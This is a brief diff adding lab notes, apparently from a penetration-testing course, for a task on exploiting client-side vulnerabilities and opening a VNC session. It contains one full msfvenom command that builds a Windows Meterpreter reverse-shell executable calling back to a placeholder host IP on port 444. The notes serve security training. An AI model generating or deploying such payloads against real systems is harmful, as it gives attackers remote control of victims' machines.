@@ -1,0 +1,6 @@
+Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /root/Desktop/Test.exe 
+
+13.-
+
